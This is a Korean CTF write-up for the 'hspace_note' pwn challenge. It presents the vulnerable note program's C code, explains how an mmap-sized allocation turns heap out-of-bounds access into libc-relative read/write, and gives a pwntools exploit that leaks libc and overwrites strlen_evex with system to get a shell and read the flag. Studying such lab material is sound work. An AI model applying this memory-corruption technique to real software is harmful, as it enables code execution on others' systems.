# pwn-hspace_note

# Usage
- 2024.07#0

# Concept
- Heap Out-of-Bounds Read/Write
- MMAP_THRESHOLD

# Writeup

####  chall.py
hspace_babynote 문제를 읽으셨다면, 해당 코드에서 delete 기능만 제거됐습니다.

```c
    while (1){
        menu();
        int choice;
        printf(">> ");
        scanf("%d", &choice);
        switch (choice){
            case 1:
                add();
                break;
            case 2:
                edit();
                break;
            case 3:
                show();
                break;
            case 4:
                exit(0);
                break;
            default:
                puts("Invalid choice");
                break;
        }
    }
```
일반적인 노트 문제와 같이 add, edit, show 메뉴가 주어집니다.

```c
void add()
{
    int idx, lines;
    char buf[0x100];
    printf("Page: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 20){
        puts("Invalid index");
        return;
    }
    printf("Lines: ");
    scanf("%d", &lines);
    if (lines < 0 || lines > 0x3000){
        puts("Invalid number of lines");
        return;
    }
    pages[idx] = (char*)malloc(lines*0x10ULL);
    printf("Note: ");
    read(0, pages[idx], lines*0x10ULL);
}

```
add 메뉴로 최대 20개까지 [사용자가 입력한 line * 0x10]의 크기로 청크를 할당하고 입력할 수 있습니다.


```c
void edit()
{
    int idx;
    printf("Page: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 20){
        puts("Invalid index");
        return;
    }
    if (pages[idx] == NULL){
        puts("Invalid index");
        return;
    }
    char* cur = pages[idx];
    printf("Line: ");
    scanf("%d", &idx);
    cur += 0x10ULL*idx;
    printf("Note: ");
    read(0, cur, 0x10ULL);
}
```
edit 메뉴로 할당받은 청크부터 임의의 offset만큼 떨어진 주소에 0x10만큼 write할 수 있는 OOB Write 취약점이 주어집니다. (*Note: 음수 offset도 가능)

```c
void show()
{
    int idx;
    printf("Page: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >=20){
        puts("Invalid index");
        return;
    }
    if (pages[idx] == NULL){
        puts("Invalid index");
        return;
    }
    char* cur = pages[idx];
    printf("Line: ");
    scanf("%d", &idx);
    cur += 0x10ULL*idx;
    printf("%s", cur);
}
```
마찬가지로 show 메뉴에서 할당된 청크로부터 임의의 offset만큼 떨어진 주소에서 0x10만큼 read할 수 있는 OOB 취약점이 주어집니다.

#### Exploit Scenario
정리해보면 힙 상에서 자유롭게 relative-read/write를 할 수 있는 상황입니다. 따라서 hspace_babynote처럼 할당한 청크를 해제할 수 있는 primitive가 있다면 free chunk의 포인터 정보를 leak/overwrite하는 방식으로 임의 코드를 실행할 수 있을 것입니다.

하지만 청크를 해제할 수 있는 방법이 아예 없기 때문에 힙 상에서 존재하는 청크들의 메타데이터를 아무리 자유롭게 조작해두어도 해제 및 재할당을 트리거할 수 없습니다. 따라서 해제된 청크의 포인터를 이용한 libc leak이나 임의 주소 할당을 통한 AAW를 달성하기 어렵습니다.

```
0x000055f26f843000 0x000055f26f844000 0x0000000000001000 0x0000000000003000 rw- /pwn-hspace_note/prob/for_organizer/chall
0x000055f2706ff000 0x000055f270720000 0x0000000000021000 0x0000000000000000 rw- [heap]
0x00007fee67ec3000 0x00007fee67ec6000 0x0000000000003000 0x0000000000000000 rw- <tls-th1>
0x00007fee67ec6000 0x00007fee67eee000 0x0000000000028000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
```
mmap을 통해 chunk를 할당받는다면 이런 어려움을 우회할 수 있습니다. malloc에 MMAP_THRESHOLD(0x20000) 바이트 이상의 할당을 요청하면 mmap을 통해 청크가 할당됩니다. heap 영역이 다른 영역과 인접하지 않게 할당되는 것과 달리, mmap 영역(tls-th1)에 할당된 청크는 libc 영역과 바로 인접한 것을 확인할 수 있습니다.

따라서 mmap으로 청크를 할당받는다면 heap relative read/write를 libc relative read/write로 바꿀 수 있습니다. 이후에는 접근할 수 있는 아무 포인터로 libc base를 확인, system으로 strlen_evex를 덮고 printf("%s", '/bin/sh')를 호출하여 플래그를 얻을 수 있습니다.  

#### ex.py
```python
def exploit(p):
    offset = 0x246088
    
    add(0, 0x100, b"/bin/sh\x00"*0x10)
    add(1, 0x28000, b"A"*0x10) ## allocate by mmap
    show(1, offset)
    libc_base = u64(p.recv(6).ljust(8, b"\x00"))-0x1b32b0
    libc.address = libc_base
    log.info("libc_base: 0x{:x}".format(libc_base))
    system = libc.sym["system"]
    edit(1,offset, p64(system)+p64(system))
    show(0, 0)
    p.sendline("cat flag.txt")
    print(p.recv(0x100))
    p.interactive()
    return
```
